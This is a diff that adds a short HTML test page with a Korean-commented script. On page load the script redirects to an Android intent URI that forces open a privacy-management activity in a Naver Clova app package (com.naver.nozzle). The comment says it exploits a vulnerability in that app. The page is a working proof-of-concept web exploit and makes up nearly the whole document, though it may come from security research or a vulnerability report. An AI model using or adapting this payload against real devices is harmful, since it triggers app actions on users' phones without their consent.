@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>Test</title></head>
+<body>
+    <h1>Hellllooooo!!!</h1>
+    
+    <script>
+        // 페이지 로드와 동시에 클로바 앱의 취약점을 이용해 인텐트를 쏩니다.
+        window.onload = function() {
+            // 예: 개인정보 관리 화면 강제 실행
+          location.href = "intent:#Intent;component=com.naver.nozzle/com.naver.nozzle.setting.optout.PrivacyManagementActivity;end";
+        };
+    </script>
+</body>
+</html>
